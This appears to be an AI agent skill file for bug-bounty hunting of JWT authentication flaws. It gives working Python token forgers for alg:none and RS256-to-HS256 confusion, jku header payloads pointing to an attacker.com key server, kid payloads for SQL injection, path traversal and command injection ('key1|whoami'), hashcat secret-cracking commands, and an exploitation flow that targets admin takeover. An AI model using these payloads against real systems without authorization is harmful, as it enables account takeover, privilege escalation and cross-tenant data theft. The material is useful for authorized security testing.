---
name: jwt-testing
description: "JWT authentication attack hunting — algorithm none/confusion, jku/x5u/kid injection, claim tampering, secret brute-force, refresh token abuse. Use when testing JWT-based auth, API tokens, OAuth/OIDC flows, or SSO implementations."
---

# JWT Attack Techniques

## Crown Jewel Targets

- **SaaS admin panels** with JWT-based RBAC — algorithm confusion → admin role claim → full tenant takeover (Critical bounty)
- **OAuth/OIDC providers** (Auth0, Okta, custom) — kid injection or jku redirect → forge tokens for any user
- **Single-page apps** with client-side JWT decode — secrets in JS bundles, weak HS256 secrets crackable with hashcat
- **Microservice APIs** with shared JWT validation — one weak service accepts alg:none → lateral movement across all services
- **Mobile app backends** with long-lived JWTs — refresh token rotation not enforced → persistent ATO
- **B2B platforms** with multi-tenant JWT — modify `org_id`/`tenant_id` claim → cross-tenant data access
- **Legacy Java apps** with JJWT < 0.12.0 or nimbus-jose-jwt — known CVEs in algorithm handling

## Attack Surface Signals

- **URL patterns**: `/.well-known/jwks.json`, `/.well-known/openid-configuration`, `/oauth/certs`, `/api/v1/auth/token`, `/oauth/token`
- **Response headers**: `Authorization: Bearer eyJ...`, `Set-Cookie: jwt=eyJ...`, `X-Auth-Token: eyJ...`
- **Response body patterns**: `"token":"eyJ..."`, `"access_token":"eyJ..."`, `"id_token":"eyJ..."`
- **Tech stack signals**: Auth0 (`/authorize`, `auth0.com` in CSP), Okta (`/oauth2/default`), Keycloak (`/auth/realms/`)
- **JS bundle patterns**: `jwt_decode`, `jsonwebtoken`, `jose`, `jwt-decode`, `@auth0/auth0-spa-js`
- **Error messages**: `JWT expired`, `invalid signature`, `algorithm not supported`, `token malformed`

## Detection — Find JWT Usage

```bash
# JWT in cookies
curl -sI https://target.com/login -c - | grep -iE "(jwt|token|session)" 

# JWT in responses
curl -s https://target.com/api/login -d '{"user":"test","pass":"test"}' | grep -oE 'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'

# JWT in JS bundles
grep -rnoE 'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.' target_js/

# Decode JWT header (no secret needed)
echo 'eyJhbGciOiJSUzI1NiJ9' | base64 -d 2>/dev/null
# Shows: {"alg":"RS256"} → tells you the algorithm
```

## Attack Vectors

### A. Algorithm None (CRITICAL)
```python
# If server accepts alg: "none"
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
# Try: header.decode() + "." + payload.decode() + "."
# Also try empty signature AND no trailing dot
```

### B. Algorithm Confusion RS256→HS256 (CRITICAL)
```bash
# If server uses RS256 but accepts HS256:
# 1. Get the public key (often at /.well-known/jwks.json or /oauth/certs)
curl -s https://target.com/.well-known/jwks.json

# 2. Convert JWK to PEM
# 3. Sign token with HS256 using the PUBLIC KEY as the secret
python3 -c "
import jwt
public_key = open('public_key.pem').read()
token = jwt.encode({'sub':'admin','role':'admin'}, public_key, algorithm='HS256')
print(token)
"
```

### C. JWKS Injection (jku / x5u header)
```json
// Craft JWT with jku pointing to attacker-controlled key server
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json",
  "kid": "attacker-key-1"
}
// Server fetches YOUR public key → validates YOUR signature
```

### D. kid (Key ID) Injection
```json
// SQL injection via kid
{"alg":"HS256", "kid":"' UNION SELECT 'mysecret' -- "}

// Path traversal via kid  
{"alg":"HS256", "kid":"../../dev/null"}
// Sign with empty string as secret (null file = empty content)

// Command injection via kid (rare)
{"alg":"HS256", "kid":"key1|whoami"}
```

### E. Claim Tampering (after finding weak secret)
```bash
# Neither hashcat nor jwt_tool ships in this image — check before planning around
# them. python3 does ship, and HS256 cracking is a few lines of hmac/hashlib over
# a wordlist, which is enough to prove a weak secret.

# Brute-force JWT secret
# hashcat:
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt

# Common weak secrets: secret, password, 123456, changeme, your-256-bit-secret
```

### F. Token Lifetime / Refresh Abuse
```bash
# Check if expired tokens are still accepted
# Decode → change "exp" to future → re-sign (if secret known)

# Check if refresh token rotation is implemented
# Reuse old refresh token after new one issued
curl -X POST https://target.com/oauth/token \
  -d "grant_type=refresh_token&refresh_token=OLD_TOKEN"
```

## Exploitation Flow

```
1. Capture JWT (cookie, Authorization header, URL param)
   ↓
2. Decode header → identify algorithm (RS256, HS256, ES256)
   ↓
3. Try algorithm confusion (none, RS256→HS256)
   ↓
4. Check for jku/x5u/kid injection vectors
   ↓
5. Brute-force secret (if HS256)
   ↓
6. Modify claims (sub, role, admin, email) → forge token
   ↓
7. Prove access escalation with forged token
```

## Tools

| Tool | Use |
|------|-----|
| `jwt_tool` | All-in-one JWT testing |
| `jwt.io` | Quick decode (DON'T paste production tokens!) |
| `hashcat -m 16500` | HS256 secret brute-force |
| `john --format=HMAC-SHA256` | JWT secret cracking |
| Burp JWT Editor | Intercept + modify in proxy |

## Impact Requirements

Must demonstrate:
- **Privilege escalation**: Regular user → admin via modified claims
- **Auth bypass**: Access without valid credentials
- **Account takeover**: Impersonate another user via forged sub claim

**Rejected**: Expired token not invalidated (low impact), JWT in URL (informational), weak secret without exploitation.

## Triage Checklist

- [ ] JWT algorithm identified
- [ ] Attack vector confirmed (not just theoretical)
- [ ] Forged token accepted by server (prove with response)
- [ ] Privilege escalation or auth bypass demonstrated
- [ ] Impact beyond token manipulation shown (accessed restricted resource)
- [ ] Not just "JWT uses weak algorithm" without exploitation

## PortSwigger Academy — Advanced Techniques

### Algorithm None — Case Variations
- Standard `"none"` often blocked. Try case variations: `None`, `NONE`, `nOnE`, `NoNe`
- Some libraries perform case-sensitive checks on algorithm name

### Signature Not Verified (decode vs verify)
- Server calls `decode()` instead of `verify()` — signature is never checked
- Modify any claims freely, keep the original signature intact — server accepts it
- Test: change `sub` claim to another user, resend with original signature unchanged

### Embedded JWK Attack
- Set `jwk` header parameter to your own RSA public key
- Sign the token with your corresponding private key
- Server trusts the embedded key instead of its own: `{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}`

### JKU Injection
- Point `jku` (JWK Set URL) header to attacker-hosted JWK Set: `"jku":"https://attacker.com/.well-known/jwks.json"`
- Bypass URL whitelist via SSRF, open redirect, URL parsing differences, or directory traversal on trusted domain
- Host a valid JWK Set containing your public key at the attacker URL

### kid Path Traversal to /dev/null
- `"kid":"../../dev/null"` combined with `"alg":"HS256"`
- `/dev/null` returns empty bytes — sign the token with an empty string as the secret
- Symmetric signing with known (empty) key = full token forgery

### kid SQL Injection
- `"kid":"' UNION SELECT 'attacker_secret' -- "` — database returns `attacker_secret` as the key
- Sign the forged token with `attacker_secret` as the HS256 secret
- Requires kid to be looked up from a database table

### cty Header Injection
- After achieving JWT bypass, set `"cty":"text/xml"` to trigger XML parsing of the payload
- Can chain into XXE or Java deserialization depending on server-side JWT library implementation

### Public Key Derivation from Tokens
- `rsa_sign2n` tool (from `jwt_forgery.py`) derives the RSA public key from just 2 signed tokens
- Once public key is recovered, use it for algorithm confusion attack (RS256 to HS256)
- No need to find `/.well-known/jwks.json` — extract the key mathematically

## Operator Notes (Battle-Tested)

1. **Always decode the header first** before any attack. `echo 'header_b64' | base64 -d` tells you the algorithm — RS256 means try algorithm confusion, HS256 means try brute-force. Skipping this wastes 30 minutes testing wrong vectors.
2. **jwt_tool is the fastest path to coverage**: `python3 jwt_tool.py TOKEN -M at` runs all tampering tests automatically. Follow up with manual kid injection and jku if automated scan finds nothing.
3. **Collect 2+ tokens from different sessions** before hunting. `rsa_sign2n` can derive the public key from just 2 signed tokens — this enables algorithm confusion without finding the JWKS endpoint.
4. **Check `.well-known/openid-configuration` first** — it maps all auth endpoints, signing algorithms, and supported grant types in one request. Many hunters skip this and miss jku/x5u vectors entirely.
5. **Burp JWT Editor extension is essential** for intercepting and modifying tokens in real-time. Never paste production tokens into jwt.io — use offline tools only.

## Related Skills & Chains

| When | Go to |
|------|-------|
| JWT uses OAuth/OIDC flow | `oauth-testing` |
| JWT wraps SAML assertion | `auth-bypass-testing` → `references/saml-bypass-techniques.md` |
| kid parameter accepts file path | `lfi-path-traversal` (kid path traversal to /dev/null) |
| kid parameter hits database | `sql-injection-testing` → `references/nosqli-techniques.md` or SQL injection patterns |
| jku points to URL you can redirect | `open-redirect` → `ssrf-testing` |
| WAF blocks JWT tampering payloads | `waf-bypass` → `references/waf-generic-evasion.md` |
| Need to test all API endpoints with forged JWT | `api-security-testing` |
